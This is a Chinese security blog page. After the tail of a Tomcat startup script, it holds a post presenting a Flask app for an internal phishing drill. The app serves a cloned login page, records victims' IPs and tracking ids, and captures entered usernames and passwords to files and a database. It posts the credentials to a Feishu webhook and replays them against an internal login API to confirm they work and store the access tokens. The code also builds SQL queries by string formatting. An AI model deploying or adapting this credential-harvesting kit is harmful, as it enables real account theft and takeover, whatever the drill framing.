class="variable">$CLASSPATH</span>\&quot;&quot;</span> \</span><br><span class="line">      -Dcatalina.base=<span class="string">&quot;\&quot;<span class="variable">$CATALINA_BASE</span>\&quot;&quot;</span> \</span><br><span class="line">      -Dcatalina.home=<span class="string">&quot;\&quot;<span class="variable">$CATALINA_HOME</span>\&quot;&quot;</span> \</span><br><span class="line">      -Djava.io.tmpdir=<span class="string">&quot;\&quot;<span class="variable">$CATALINA_TMPDIR</span>\&quot;&quot;</span> \</span><br><span class="line">      org.apache.catalina.startup.Bootstrap configtest</span><br><span class="line">    result=$?</span><br><span class="line">    <span class="keyword">if</span> [ <span class="variable">$result</span> -ne 0 ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Configuration error detected!&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="built_in">exit</span> <span class="variable">$result</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> [ <span class="string">&quot;<span class="variable">$1</span>&quot;</span> = <span class="string">&quot;version&quot;</span> ] ; <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;<span class="variable">$_RUNJAVA</span>&quot;</span>   \</span><br><span class="line">      -classpath <span class="string">&quot;<span class="variable">$CATALINA_HOME</span>/lib/catalina.jar&quot;</span> \</span><br><span class="line">      org.apache.catalina.util.ServerInfo</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Usage: catalina.sh ( commands ... )&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;commands:&quot;</span></span><br><span class="line">  <span class="keyword">if</span> <span class="variable">$os400</span>; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;  debug             Start Catalina in a debugger (not available on OS400)&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;  debug -security   Debug Catalina with a security manager (not available on OS400)&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;  debug             Start Catalina in a debugger&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;  debug -security   Debug Catalina with a security manager&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;  jpda start        Start Catalina under JPDA debugger&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;  run               Start Catalina in the current window&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;  run -security     Start in the current window with security manager&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;  start             Start Catalina in a separate window&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;  start -security   Start in a separate window with security manager&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;  stop              Stop Catalina, waiting up to 5 seconds for the process to end&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;  stop n            Stop Catalina, waiting up to n seconds for the process to end&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;  stop -force       Stop Catalina, wait up to 5 seconds and then use kill -KILL if still running&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;  stop n -force     Stop Catalina, wait up to n seconds and then use kill -KILL if still running&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;  configtest        Run a basic syntax check on server.xml - check exit code for result&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;  version           What version of tomcat are you running?&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Note: Waiting for the process to end and use of the -force option require that \$CATALINA_PID is defined&quot;</span></span><br><span class="line">  <span class="built_in">exit</span> 1</span><br><span class="line"></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/" rel="tag">安全开发</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-企业内部模拟钓鱼演练" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2022/04/08/%E4%BC%81%E4%B8%9A%E5%86%85%E9%83%A8%E6%A8%A1%E6%8B%9F%E9%92%93%E9%B1%BC%E6%BC%94%E7%BB%83/" class="article-date">
  	<time datetime="2022-04-08T09:49:30.000Z" itemprop="datePublished">2022-04-08</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/04/08/%E4%BC%81%E4%B8%9A%E5%86%85%E9%83%A8%E6%A8%A1%E6%8B%9F%E9%92%93%E9%B1%BC%E6%BC%94%E7%BB%83/">
        企业内部模拟钓鱼演练
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>最近对企业需要做钓鱼演练于是写了一个，具体细节下次详细写一下=。=，update</p>
<p>思路如下：</p>
<p><img src="/2022/04/08/%E4%BC%81%E4%B8%9A%E5%86%85%E9%83%A8%E6%A8%A1%E6%8B%9F%E9%92%93%E9%B1%BC%E6%BC%94%E7%BB%83/image-20220413110029985.png" alt="image-20220413110029985"></p>
<h3 id="1-flask-fishing-db"><a href="#1-flask-fishing-db" class="headerlink" title="1.flask-fishing-db"></a>1.flask-fishing-db</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,jsonify,render_template,make_response</span><br><span class="line"><span class="keyword">import</span> requests,hashlib</span><br><span class="line"><span class="keyword">from</span> flask_cors <span class="keyword">import</span> CORS</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> logging.config</span><br><span class="line"><span class="keyword">import</span> termcolor</span><br><span class="line"></span><br><span class="line"><span class="comment">#日志记录参考https://juejin.cn/post/7035203154035605535</span></span><br><span class="line"><span class="comment">#坑点，看到的日志是有werkzeug记录的并不是flask自己记录的</span></span><br><span class="line"><span class="comment">#将日志写入文件的配置示例，当日志文件大小大于 10M 后，就用一个新的文件来存放日志，总的日志文件数目是50个。debug 的信息写入 debug.log，info 的信息写入 info.log，error 的信息写入 error.log。</span></span><br><span class="line"><span class="comment">#1.如果开启日志配置，建议用terminal模式</span></span><br><span class="line"><span class="comment">#2.如果不开启日志，本地debug模式，可以释掉日志配置</span></span><br><span class="line"><span class="comment"># logging.config.dictConfig(</span></span><br><span class="line"><span class="comment">#     &#123;</span></span><br><span class="line"><span class="comment">#         &quot;version&quot;: 1,</span></span><br><span class="line"><span class="comment">#         &quot;disable_existing_loggers&quot;: False,</span></span><br><span class="line"><span class="comment">#         &quot;formatters&quot;: &#123;</span></span><br><span class="line"><span class="comment">#             &quot;simple&quot;: &#123;&quot;format&quot;: &quot;%(asctime)s - %(name)s - %(levelname)s - %(message)s&quot;&#125;</span></span><br><span class="line"><span class="comment">#         &#125;,</span></span><br><span class="line"><span class="comment">#         &quot;handlers&quot;: &#123;</span></span><br><span class="line"><span class="comment">#             &quot;console&quot;: &#123;</span></span><br><span class="line"><span class="comment">#                 &quot;class&quot;: &quot;logging.StreamHandler&quot;,</span></span><br><span class="line"><span class="comment">#                 &quot;level&quot;: &quot;DEBUG&quot;,</span></span><br><span class="line"><span class="comment">#                 &quot;formatter&quot;: &quot;simple&quot;,</span></span><br><span class="line"><span class="comment">#                 &quot;stream&quot;: &quot;ext://sys.stdout&quot;,</span></span><br><span class="line"><span class="comment">#             &#125;,</span></span><br><span class="line"><span class="comment">#             &quot;info_file_handler&quot;: &#123;</span></span><br><span class="line"><span class="comment">#                 &quot;class&quot;: &quot;logging.handlers.RotatingFileHandler&quot;,</span></span><br><span class="line"><span class="comment">#                 &quot;level&quot;: &quot;INFO&quot;,</span></span><br><span class="line"><span class="comment">#                 &quot;formatter&quot;: &quot;simple&quot;,</span></span><br><span class="line"><span class="comment">#                 &quot;filename&quot;: &quot;info.log&quot;,</span></span><br><span class="line"><span class="comment">#                 &quot;maxBytes&quot;: 10485760,</span></span><br><span class="line"><span class="comment">#                 &quot;backupCount&quot;: 50,</span></span><br><span class="line"><span class="comment">#                 &quot;encoding&quot;: &quot;utf8&quot;,</span></span><br><span class="line"><span class="comment">#             &#125;,</span></span><br><span class="line"><span class="comment">#             &quot;error_file_handler&quot;: &#123;</span></span><br><span class="line"><span class="comment">#                 &quot;class&quot;: &quot;logging.handlers.RotatingFileHandler&quot;,</span></span><br><span class="line"><span class="comment">#                 &quot;level&quot;: &quot;ERROR&quot;,</span></span><br><span class="line"><span class="comment">#                 &quot;formatter&quot;: &quot;simple&quot;,</span></span><br><span class="line"><span class="comment">#                 &quot;filename&quot;: &quot;errors.log&quot;,</span></span><br><span class="line"><span class="comment">#                 &quot;maxBytes&quot;: 10485760,</span></span><br><span class="line"><span class="comment">#                 &quot;backupCount&quot;: 20,</span></span><br><span class="line"><span class="comment">#                 &quot;encoding&quot;: &quot;utf8&quot;,</span></span><br><span class="line"><span class="comment">#             &#125;,</span></span><br><span class="line"><span class="comment">#             &quot;debug_file_handler&quot;: &#123;</span></span><br><span class="line"><span class="comment">#                 &quot;class&quot;: &quot;logging.handlers.RotatingFileHandler&quot;,</span></span><br><span class="line"><span class="comment">#                 &quot;level&quot;: &quot;DEBUG&quot;,</span></span><br><span class="line"><span class="comment">#                 &quot;formatter&quot;: &quot;simple&quot;,</span></span><br><span class="line"><span class="comment">#                 &quot;filename&quot;: &quot;debug.log&quot;,</span></span><br><span class="line"><span class="comment">#                 &quot;maxBytes&quot;: 10485760,</span></span><br><span class="line"><span class="comment">#                 &quot;backupCount&quot;: 50,</span></span><br><span class="line"><span class="comment">#                 &quot;encoding&quot;: &quot;utf8&quot;,</span></span><br><span class="line"><span class="comment">#             &#125;,</span></span><br><span class="line"><span class="comment">#         &#125;,</span></span><br><span class="line"><span class="comment">#         &quot;loggers&quot;: &#123;</span></span><br><span class="line"><span class="comment">#             &quot;my_module&quot;: &#123;&quot;level&quot;: &quot;ERROR&quot;, &quot;handlers&quot;: [&quot;console&quot;], &quot;propagate&quot;: &quot;no&quot;&#125;</span></span><br><span class="line"><span class="comment">#         &#125;,</span></span><br><span class="line"><span class="comment">#         &quot;root&quot;: &#123;</span></span><br><span class="line"><span class="comment">#             &quot;level&quot;: &quot;DEBUG&quot;,</span></span><br><span class="line"><span class="comment">#             &quot;handlers&quot;: [&quot;error_file_handler&quot;, &quot;debug_file_handler&quot;],</span></span><br><span class="line"><span class="comment">#         &#125;,</span></span><br><span class="line"><span class="comment">#     &#125;</span></span><br><span class="line"><span class="comment"># )</span></span><br><span class="line"></span><br><span class="line">template_folder=<span class="string">&quot;HRIS/templates&quot;</span><span class="comment">#把需要用的静态页面放在这里</span></span><br><span class="line">static_folder=<span class="string">&quot;HRIS/static&quot;</span></span><br><span class="line">static_url_path=<span class="string">&quot;&quot;</span></span><br><span class="line">app =Flask(__name__ ,template_folder=template_folder,static_folder=static_folder,static_url_path=static_url_path)</span><br><span class="line">cors =CORS(app,resource=&#123;<span class="string">r&quot;/*&quot;</span>:&#123;<span class="string">&quot;origins&quot;</span>:<span class="string">&quot;*&quot;</span>&#125;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>,methods=[<span class="string">&quot;get&quot;</span>,<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;Loginx.aspx.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/index&quot;</span>,methods=[<span class="string">&quot;get&quot;</span>,<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index2</span>():</span><span class="comment">#randomid通过邮件发送，一个用户一个randomid方便后期识别谁点击了</span></span><br><span class="line">    conn = sqlite3.connect(<span class="string">&quot;fishing.db&quot;</span>)</span><br><span class="line">    cu = conn.cursor()</span><br><span class="line">    randomid = request.args.get(<span class="string">&quot;randomid&quot;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    host = <span class="built_in">str</span>(request.remote_addr)</span><br><span class="line">    timestart = datetime.datetime.now()</span><br><span class="line">    cu.execute(<span class="string">&quot;insert into randomid(host,randomid,timestart)values(&#x27;%s&#x27;,&#x27;%s&#x27;,&#x27;%s&#x27;)&quot;</span> % (host, randomid, timestart))</span><br><span class="line">    conn.commit()</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;Loginx.aspx.html&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/index.aspx&quot;</span>,methods=[<span class="string">&quot;get&quot;</span>,<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index3</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;Loginx.aspx.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/fishhook&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">    conn = sqlite3.connect(<span class="string">&quot;fishing.db&quot;</span>)</span><br><span class="line">    c = conn.cursor()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    usr=request.args.get(<span class="string">&#x27;usr&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    pwd=request.args.get(<span class="string">&#x27;pwd&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    host=<span class="built_in">str</span>(request.remote_addr)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;suc.txt&quot;</span>,<span class="string">&quot;a+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">&quot;[INFO]有鱼在尝试：&quot;</span>+host+<span class="string">&quot;-&quot;</span>+usr+<span class="string">&quot;:&quot;</span>+pwd+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    message=<span class="string">&quot;[INFO]有鱼在尝试：&quot;</span>+host+<span class="string">&quot;-&quot;</span>+usr+<span class="string">&quot;:&quot;</span>+pwd</span><br><span class="line">    keyword=usr+<span class="string">&quot;:&quot;</span>+pwd</span><br><span class="line">    timestart=datetime.datetime.now()</span><br><span class="line">    c.execute(<span class="string">&quot;insert into info(host,keyword,timestart)values(&#x27;%s&#x27;,&#x27;%s&#x27;,&#x27;%s&#x27;)&quot;</span> % (</span><br><span class="line">    host,keyword,timestart))</span><br><span class="line">    conn.commit()</span><br><span class="line"></span><br><span class="line">    url = <span class="string">&quot;https://open.feishu.cn/open-apis/bot/v2/hook/******&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    payload_message = &#123;</span><br><span class="line">        <span class="string">&quot;msg_type&quot;</span>: <span class="string">&quot;text&quot;</span>,</span><br><span class="line">        <span class="string">&quot;content&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;text&quot;</span>: message</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.request(<span class="string">&quot;POST&quot;</span>, url, headers=headers, data=json.dumps(payload_message))</span><br><span class="line">    <span class="comment"># return response</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;p&gt;hello world&lt;/p&gt;&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/checksuc&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checksuc</span>():</span></span><br><span class="line">    conn = sqlite3.connect(<span class="string">&quot;fishing.db&quot;</span>)</span><br><span class="line">    ck = conn.cursor()</span><br><span class="line">    usr = request.args.get(<span class="string">&#x27;usr&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    pwd = request.args.get(<span class="string">&#x27;pwd&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    host = <span class="built_in">str</span>(request.remote_addr)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;application/json, text/plain, */*&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;http://******&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X -1_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json;charset=UTF-8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://******/login?redirect=%2FITSM%2Fworkflow%2FallTickets%2FallTickets&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;X-Forward-For&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data = <span class="string">&#x27;&#123;&quot;username&quot;:&quot;&#x27;</span>+usr+<span class="string">&#x27;&quot;,&quot;password&quot;:&quot;&#x27;</span>+pwd+<span class="string">&#x27;&quot;,&quot;code&quot;:&quot;&quot;,&quot;randomid&quot;:&quot;&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">    respx = requests.post(<span class="string">&#x27;http://******/cms/v1/login&#x27;</span>, headers=headers, data=data, verify=<span class="literal">False</span>,timeout=<span class="number">5</span>)</span><br><span class="line">    <span class="built_in">print</span>(respx.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;access_token&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> respx.text:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;status&#x27;</span>:<span class="string">&#x27;fail&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span> (<span class="string">&quot;finall.txt&quot;</span>,<span class="string">&quot;a+&quot;</span>) <span class="keyword">as</span> ff:</span><br><span class="line">            ff.write(<span class="string">&quot;[BOOM]有鱼上钩！！！！！！！！！！：&quot;</span>+host+<span class="string">&quot;-&quot;</span>+usr+<span class="string">&quot;:&quot;</span>+pwd+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            ff.write(respx.text+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            ff.write(<span class="string">&#x27;======================&#x27;</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        message2=<span class="string">&quot;[BOOM]有鱼上钩！！！！！！！！！！：&quot;</span>+host+<span class="string">&quot;-&quot;</span>+usr+<span class="string">&quot;:&quot;</span>+pwd</span><br><span class="line">        session_devops=respx.text</span><br><span class="line">        timestart = datetime.datetime.now()</span><br><span class="line">        ck.execute(<span class="string">&quot;insert into boom(host,usr,pwd,timestart,session_devops)values(&#x27;%s&#x27;,&#x27;%s&#x27;,&#x27;%s&#x27;,&#x27;%s&#x27;,&#x27;%s&#x27;)&quot;</span> % (</span><br><span class="line">            host, usr,pwd,timestart,session_devops))</span><br><span class="line">        conn.commit()</span><br><span class="line">        url = <span class="string">&quot;https://open.feishu.cn/open-apis/bot/v2/hook/******&quot;</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        payload_message2 = &#123;</span><br><span class="line">            <span class="string">&quot;msg_type&quot;</span>: <span class="string">&quot;text&quot;</span>,</span><br><span class="line">            <span class="string">&quot;content&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;text&quot;</span>: message2</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.request(<span class="string">&quot;POST&quot;</span>, url, headers=headers, data=json.dumps(payload_message2),timeout=<span class="number">3</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># return response</span></span><br><span class="line">        <span class="comment">#return jsonify(&#123; &#x27;status&#x27;: 0, &#x27;message&#x27;: &#x27;success&#x27;, &#x27;data&#x27;: &#x27;登录成功&#x27; &#125;)</span></span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;status&#x27;</span>:<span class="string">&#x27;success&#x27;</span>&#125;)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">creat_db</span>():</span></span><br><span class="line">    conn = sqlite3.connect(<span class="string">&quot;fishing.db&quot;</span>)</span><br><span class="line">    c = conn.cursor()</span><br><span class="line">    symbol_info = <span class="string">&#x27;info&#x27;</span></span><br><span class="line">    symbol_boom = <span class="string">&#x27;boom&#x27;</span></span><br><span class="line">    symbol_randomid=<span class="string">&#x27;randomid&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        c.execute(</span><br><span class="line">            <span class="string">&#x27;create table IF NOT EXISTS %s(id integer PRIMARY KEY autoincrement,host varchar(255),keyword varchar(255) ,timestart varchar (255))&#x27;</span> % symbol_info)</span><br><span class="line">        <span class="comment"># 提交到数据库</span></span><br><span class="line">        conn.commit()</span><br><span class="line">        c.execute(</span><br><span class="line">            <span class="string">&#x27;create table IF NOT EXISTS %s(id integer PRIMARY KEY autoincrement,host varchar(255),usr varchar(255) ,pwd varchar (255),timestart varchar (255),session_devops varchar(9999))&#x27;</span> % symbol_boom)</span><br><span class="line">        <span class="comment"># 提交到数据库</span></span><br><span class="line">        conn.commit()</span><br><span class="line">        c.execute(</span><br><span class="line">            <span class="string">&#x27;create table IF NOT EXISTS %s(id integer PRIMARY KEY autoincrement,host varchar(255),randomid varchar(255),timestart varchar (255))&#x27;</span> % symbol_randomid)</span><br><span class="line">        <span class="comment"># 提交到数据库</span></span><br><span class="line">        conn.commit()</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(termcolor.colored(<span class="string">&#x27;Create table Successful!&#x27;</span>,<span class="string">&quot;green&quot;</span>))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="built_in">print</span>(termcolor.colored(<span class="string">&#x27;Create table failed&#x27;</span>,<span class="string">&quot;yellow&quot;</span>))</span><br><span class="line">       </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    creat_db()</span><br><span class="line">    <span class="built_in">print</span>(termcolor.colored(<span class="string">&#x27;开始钓鱼，请等待鱼儿上钩....正在监听当前ip的5000端口&#x27;</span>,<span class="string">&quot;green&quot;</span>))</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">5000</span>,debug=<span class="literal">False</span>)</span><br><span class="line">    </span><br><span class="line"></span><br></pre></td></tr></table></figure>

